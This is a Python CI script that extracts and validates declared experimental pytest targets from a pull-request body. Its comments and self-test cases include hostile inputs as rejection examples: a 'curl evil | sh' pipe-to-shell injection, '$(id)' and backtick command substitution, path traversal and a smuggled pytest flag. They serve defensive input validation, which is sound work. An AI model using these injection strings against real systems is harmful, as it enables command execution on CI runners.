#!/usr/bin/env python3
"""Extract the declared experimental test scope from a PR body.

Experimental-track PRs declare which tests the experimental CI lane should run,
in a fenced block tagged ``experimental-tests`` (see
``.github/pull_request_template.md``)::

    ```experimental-tests
    tests/experimental/test_foo.py
    tests/experimental/test_bar.py::test_baz
    ```

Running the whole ``tests/experimental/`` tree gets slower and less relevant as
the track grows, so the author declares what their change actually needs.

The declared value is a ``TEST_PATH`` -- both CI systems drive the same shell
scripts, which already accept one or more files or directories and fan out over
the GPU/toolkit matrix. So this emits a ready-to-use ``TEST_PATH`` rather than
inventing a format.

Why the PR body, specifically: GitLab's ``/bot run TEST_PATH`` carries the
target inline, but GitHub's triggers (the ``run-ci`` label, ``@flashinfer-bot
run``) carry **no argument at all**. The body is therefore the only channel a
GitHub run has for learning what to test, which is what makes a declared block
necessary rather than merely tidy. A GitHub job reads it with::

    TEST_PATH=$(scripts/pr_checks/experimental_test_scope.py \
                  --body-file body.md --test-path)

Note the matrix is unaffected: narrowing ``TEST_PATH`` narrows what runs
*within* each matrix cell, which is where the cost is.

Usage::

    experimental_test_scope.py --body-file body.md      # one target per line
    experimental_test_scope.py --body-file body.md --test-path   # TEST_PATH value
    experimental_test_scope.py --selftest

Exit codes: 0 ok, 1 missing or invalid declaration (message on stderr).
"""

from __future__ import annotations

import argparse
import pathlib
import re
import sys

FENCE_RE = re.compile(
    r"^[ \t]*```[ \t]*experimental-tests[ \t]*\n(.*?)^[ \t]*```[ \t]*$",
    re.DOTALL | re.MULTILINE,
)
ROOT = "tests/experimental/"

# A target is a path, optionally with a ``::selector`` suffix. Anything outside this
# charset is rejected outright rather than reasoned about: the value reaches a shell,
# and "starts with tests/experimental/ and has no .." accepts
# ``tests/experimental/x.py; curl evil | sh``. That is a legal filename, so the
# existence check is not a reliable backstop either -- it only happens to reject the
# obvious payloads. Keeping the guarantee explicit means callers can state it.
TARGET_RE = re.compile(
    r"^[A-Za-z0-9][A-Za-z0-9._/-]*(::[A-Za-z0-9_][A-Za-z0-9._\[\]-]*)*$"
)


def parse(body: str) -> list[str]:
    """Return declared pytest targets. Raises ValueError with a fixable message."""
    blocks = FENCE_RE.findall(body or "")
    if not blocks:
        raise ValueError(
            "no ```experimental-tests block found in the PR body. Experimental PRs "
            "must declare their test scope; see .github/pull_request_template.md"
        )
    if len(blocks) > 1:
        raise ValueError(f"found {len(blocks)} experimental-tests blocks; expected 1")

    targets, bad, unsafe = [], [], []
    for raw in blocks[0].splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line:
            continue
        # A path may carry a ::test suffix; validate only the file part.
        path = line.split("::", 1)[0]
        if not TARGET_RE.match(line):
            unsafe.append(line)
        elif not path.startswith(ROOT) or ".." in path:
            bad.append(line)
        else:
            targets.append(line)
    if unsafe:
        raise ValueError(
            "targets contain characters not allowed in a test path: "
            + ", ".join(unsafe)
        )
    if bad:
        raise ValueError(f"targets outside {ROOT}: {', '.join(bad)}")
    if not targets:
        raise ValueError(
            "the experimental-tests block is empty; declare at least one target "
            f"under {ROOT}"
        )
    return targets


def check_exists(targets: list[str], repo_root: str) -> None:
    """Verify each declared target exists. Raises ValueError listing what is missing.

    A declared path that does not exist makes the lane collect nothing and pass,
    which is a false green -- the most expensive way for this to fail, because it
    looks like coverage.
    """
    root = pathlib.Path(repo_root)
    missing = [t for t in targets if not (root / t.split("::", 1)[0]).exists()]
    if missing:
        raise ValueError(
            "declared targets do not exist in the repo: "
            + ", ".join(missing)
            + " (a path that does not exist collects no tests and passes silently)"
        )


def _selftest() -> int:
    ok = [
        (
            "```experimental-tests\ntests/experimental/test_a.py\n```",
            ["tests/experimental/test_a.py"],
        ),
        (
            "pre\n```experimental-tests\ntests/experimental/\n```\npost",
            ["tests/experimental/"],
        ),
        (
            "```experimental-tests\ntests/experimental/t.py::test_x  # why\n```",
            ["tests/experimental/t.py::test_x"],
        ),
        (
            "```experimental-tests\n\ntests/experimental/a.py\ntests/experimental/b.py\n\n```",
            ["tests/experimental/a.py", "tests/experimental/b.py"],
        ),
    ]
    bad = [
        ("", "missing block"),
        ("```experimental-tests\n```", "empty block"),
        (
            "```experimental-tests\ntests/gemm/test_x.py\n```",
            "outside tests/experimental/",
        ),
        (
            "```experimental-tests\ntests/experimental/../gemm/x.py\n```",
            "path traversal",
        ),
        (
            "```experimental-tests\ntests/experimental/a.py; curl evil | sh\n```",
            "shell metacharacters",
        ),
        (
            "```experimental-tests\ntests/experimental/$(id)\n```",
            "command substitution",
        ),
        ("```experimental-tests\ntests/experimental/`id`\n```", "backticks"),
        (
            "```experimental-tests\ntests/experimental/a.py --collect-only\n```",
            "smuggled pytest flag",
        ),
        (
            "```experimental-tests\ntests/experimental/a.py\n```\n```experimental-tests\ntests/experimental/b.py\n```",
            "two blocks",
        ),
        ("```\ntests/experimental/a.py\n```", "untagged fence"),
    ]
    failures = 0
    # check_exists is covered separately: parse() is shape-only by design, so the
    # synthetic bodies above name paths that do not exist.
    import tempfile

    with tempfile.TemporaryDirectory() as td:
        real = pathlib.Path(td) / ROOT
        real.mkdir(parents=True)
        (real / "test_real.py").write_text("")
        try:
            check_exists(
                [f"{ROOT}test_real.py", f"{ROOT}test_real.py::test_x", ROOT], td
            )
        except ValueError as e:
            print(f"FAIL (existing paths rejected): {e}", file=sys.stderr)
            failures += 1
        try:
            check_exists([f"{ROOT}test_missing.py"], td)
            print("FAIL (missing path accepted)", file=sys.stderr)
            failures += 1
        except ValueError:
            pass

    for body, want in ok:
        try:
            got = parse(body)
        except ValueError as e:
            print(f"FAIL (should parse): {e}", file=sys.stderr)
            failures += 1
            continue
        if got != want:
            print(f"FAIL: got {got}, want {want}", file=sys.stderr)
            failures += 1
    for body, why in bad:
        try:
            parse(body)
        except ValueError:
            continue
        print(f"FAIL (should have been rejected): {why}", file=sys.stderr)
        failures += 1
    print("selftest: FAILED" if failures else "selftest: all cases pass")
    return 1 if failures else 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--body-file", help="file containing the PR body")
    ap.add_argument(
        "--test-path",
        action="store_true",
        help="print targets space-separated as a TEST_PATH value for the CI scripts",
    )
    ap.add_argument(
        "--repo-root",
        default=".",
        help="repo root used to verify declared targets exist (default: cwd)",
    )
    ap.add_argument(
        "--no-check-exists",
        action="store_true",
        help="skip the existence check (parsing/validation only)",
    )
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()

    if args.selftest:
        return _selftest()
    if not args.body_file:
        ap.error("--body-file is required (or use --selftest)")

    with open(args.body_file, encoding="utf-8") as fh:
        body = fh.read()
    try:
        targets = parse(body)
        if not args.no_check_exists:
            check_exists(targets, args.repo_root)
    except ValueError as e:
        print(f"experimental test scope: {e}", file=sys.stderr)
        return 1
    print(" ".join(targets) if args.test_path else "\n".join(targets))
    return 0


if __name__ == "__main__":
    sys.exit(main())
